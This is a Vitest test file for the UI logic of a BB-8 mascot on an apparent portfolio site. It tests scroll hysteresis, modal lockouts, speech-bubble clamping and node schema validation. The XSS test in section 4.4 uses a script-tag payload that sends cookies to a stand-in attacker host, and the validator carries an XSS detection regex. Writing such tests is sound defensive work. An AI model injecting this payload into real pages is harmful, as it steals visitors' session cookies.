import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";

describe("Subsystem 4: System 1 Decision Brain (Hysteresis & Neural Ingestion Defense)", () => {
  describe("4.1 Directional Scroll Hysteresis & Oscillation Damping", () => {
    function createScrollHysteresisFilter(threshold = 8) {
      let filteredDirection = "IDLE";
      let accumulatedDelta = 0;

      return {
        update: (deltaY) => {
          accumulatedDelta += deltaY;
          if (accumulatedDelta >= threshold) {
            filteredDirection = "DOWN";
            accumulatedDelta = 0;
          } else if (accumulatedDelta <= -threshold) {
            filteredDirection = "UP";
            accumulatedDelta = 0;
          }
          return filteredDirection;
        },
        reset: () => {
          filteredDirection = "IDLE";
          accumulatedDelta = 0;
        }
      };
    }

    it("ignores rapid micro-oscillations below hysteresis threshold (+-3px jitter)", () => {
      const filter = createScrollHysteresisFilter(8);

      expect(filter.update(3)).toBe("IDLE");
      expect(filter.update(-3)).toBe("IDLE");
      expect(filter.update(2)).toBe("IDLE");
      expect(filter.update(-2)).toBe("IDLE");
    });

    it("triggers DOWN direction only when sustained delta meets or exceeds threshold", () => {
      const filter = createScrollHysteresisFilter(8);

      expect(filter.update(4)).toBe("IDLE");
      expect(filter.update(5)).toBe("DOWN"); // 4 + 5 = 9 >= 8
    });

    it("triggers UP direction only when sustained delta meets or exceeds negative threshold", () => {
      const filter = createScrollHysteresisFilter(8);

      expect(filter.update(-5)).toBe("IDLE");
      expect(filter.update(-4)).toBe("UP"); // -5 + -4 = -9 <= -8
    });

    it("resets accumulated delta cleanly upon reaching a state transition", () => {
      const filter = createScrollHysteresisFilter(8);
      filter.update(10); // Transitions to DOWN, resets accumulator
      // Next small tick should not trigger immediately
      expect(filter.update(3)).toBe("DOWN");
    });
  });

  describe("4.2 Modal Priority Locks & Autonomous Lockout", () => {
    function resolveActuatorState(activeModals, rawIntent) {
      // If any critical modal is active, lock into IDLE_PERCH and suspend all movement
      const hasActiveModal = activeModals.some((m) => m.isOpen);
      if (hasActiveModal) {
        return {
          intent: "IDLE_PERCH",
          allowAutonomousGlide: false,
          allowHorizontalWalk: false,
          suppressThoughts: true
        };
      }

      return {
        intent: rawIntent,
        allowAutonomousGlide: true,
        allowHorizontalWalk: true,
        suppressThoughts: false
      };
    }

    it("locks actuator and suspends movement when Universal Legal Modal is open", () => {
      const modals = [{ name: "universalLegalModal", isOpen: true }];
      const state = resolveActuatorState(modals, "LEAD_DESCENT");

      expect(state.intent).toBe("IDLE_PERCH");
      expect(state.allowAutonomousGlide).toBe(false);
      expect(state.allowHorizontalWalk).toBe(false);
      expect(state.suppressThoughts).toBe(true);
    });

    it("locks actuator and suspends movement when Consultation Booking Modal is open", () => {
      const modals = [{ name: "consultationModal", isOpen: true }];
      const state = resolveActuatorState(modals, "SHOWCASE_PROJECT");

      expect(state.intent).toBe("IDLE_PERCH");
      expect(state.allowAutonomousGlide).toBe(false);
    });

    it("locks actuator when Owner Admin Console is open on workspace route", () => {
      const modals = [{ name: "adminModal", isOpen: true }];
      const state = resolveActuatorState(modals, "RADAR_SWEEP");

      expect(state.intent).toBe("IDLE_PERCH");
      expect(state.allowHorizontalWalk).toBe(false);
    });

    it("permits standard autonomous navigation when all modals are closed", () => {
      const modals = [
        { name: "universalLegalModal", isOpen: false },
        { name: "consultationModal", isOpen: false }
      ];
      const state = resolveActuatorState(modals, "LEAD_DESCENT");

      expect(state.intent).toBe("LEAD_DESCENT");
      expect(state.allowAutonomousGlide).toBe(true);
      expect(state.allowHorizontalWalk).toBe(true);
      expect(state.suppressThoughts).toBe(false);
    });
  });

  describe("4.3 Thought Bubble Boundary Clamping & Tail Geometry", () => {
    function computeBubbleLayout(bb8ScreenX, bb8ScreenY, bubbleW = 280, bubbleH = 44, screenW = 390) {
      // Ideal anchor: centered above BB-8
      let left = bb8ScreenX - bubbleW / 2;
      let top = bb8ScreenY - 36 - bubbleH;
      let isFlipped = false;

      // Vertical flip if too close to sticky topbar (< 88px on mobile)
      if (top < 88) {
        top = bb8ScreenY + 28;
        isFlipped = true;
      }

      // Horizontal boundary clamping (min 12px, max screenW - 12px - bubbleW)
      const minLeft = 12;
      const maxLeft = Math.max(minLeft, screenW - 12 - bubbleW);
      left = Math.min(Math.max(left, minLeft), maxLeft);

      // Tail percentage relative to bubble width, clamped between 12% and 88%
      const rawTailPct = ((bb8ScreenX - left) / bubbleW) * 100;
      const tailPct = Math.min(Math.max(rawTailPct, 12), 88);

      return { left, top, isFlipped, tailPct };
    }

    it("clamps bubble to left boundary when BB-8 is against the left edge (x = 20)", () => {
      const layout = computeBubbleLayout(20, 300, 280, 44, 390);
      expect(layout.left).toBe(12);
      expect(layout.tailPct).toBe(12); // Clamped to min tail percentage
    });

    it("clamps bubble to right boundary when BB-8 is against the right edge (x = 370)", () => {
      const layout = computeBubbleLayout(370, 300, 280, 44, 390);
      expect(layout.left).toBe(390 - 12 - 280); // 98px
      expect(layout.tailPct).toBe(88); // Clamped to max tail percentage
    });

    it("centers tail perfectly at 50% when BB-8 is at viewport center", () => {
      const layout = computeBubbleLayout(195, 300, 280, 44, 390);
      expect(layout.left).toBe(195 - 140); // 55px
      expect(layout.tailPct).toBeCloseTo(50, 1);
    });

    it("flips bubble beneath BB-8 when vertical clearance is under 88px", () => {
      const layout = computeBubbleLayout(195, 120, 280, 44, 390);
      // 120 - 36 - 44 = 40 < 88 -> flipped!
      expect(layout.isFlipped).toBe(true);
      expect(layout.top).toBe(120 + 28);
    });
  });

  describe("4.4 Neural Knowledge Ingestion Defense & Schema Validation", () => {
    function validateNeuralNode(node) {
      if (!node || typeof node !== "object") return { valid: false, reason: "NOT_AN_OBJECT" };
      if (!node.id || typeof node.id !== "string") return { valid: false, reason: "INVALID_ID" };
      if (!node.intent || typeof node.intent !== "string") return { valid: false, reason: "INVALID_INTENT" };

      // Y-range check
      if (node.yRange) {
        if (!Array.isArray(node.yRange) || node.yRange.length !== 2) return { valid: false, reason: "MALFORMED_YRANGE" };
        const [yMin, yMax] = node.yRange;
        if (typeof yMin !== "number" || typeof yMax !== "number" || yMin > yMax) {
          return { valid: false, reason: "INVERTED_YRANGE" };
        }
      }

      // XSS check in thought templates
      if (node.thought) {
        const hasScript = /<script\b|onerror=|javascript:/i.test(node.thought);
        if (hasScript) return { valid: false, reason: "XSS_PAYLOAD_DETECTED" };
      }

      return { valid: true };
    }

    it("validates a well-formed neural knowledge node", () => {
      const validNode = {
        id: "eravex_showcase",
        intent: "SHOWCASE_PROJECT",
        yRange: [600, 1200],
        thought: "ERAVEX 3D Studio: Locked 60 FPS WebGPU engine."
      };

      const res = validateNeuralNode(validNode);
      expect(res.valid).toBe(true);
    });

    it("rejects node with inverted yRange (yMin > yMax)", () => {
      const invalidNode = {
        id: "bad_range",
        intent: "SHOWCASE_PROJECT",
        yRange: [1500, 500] // Inverted!
      };

      const res = validateNeuralNode(invalidNode);
      expect(res.valid).toBe(false);
      expect(res.reason).toBe("INVERTED_YRANGE");
    });

    it("rejects node containing XSS script payload in thought template", () => {
      const xssNode = {
        id: "exploit_attempt",
        intent: "SHOWCASE_PROJECT",
        thought: "Welcome <script>fetch('http://attacker.com/cookie')</script>"
      };

      const res = validateNeuralNode(xssNode);
      expect(res.valid).toBe(false);
      expect(res.reason).toBe("XSS_PAYLOAD_DETECTED");
    });

    it("enforces maximum ceiling of 1,000 knowledge nodes to protect in-memory latency", () => {
      const existingNodes = new Array(1000).fill({ id: "node" });
      function canAddNode(count, maxCeiling = 1000) {
        return count < maxCeiling;
      }

      expect(canAddNode(existingNodes.length)).toBe(false);
      expect(canAddNode(999)).toBe(true);
    });
  });
});
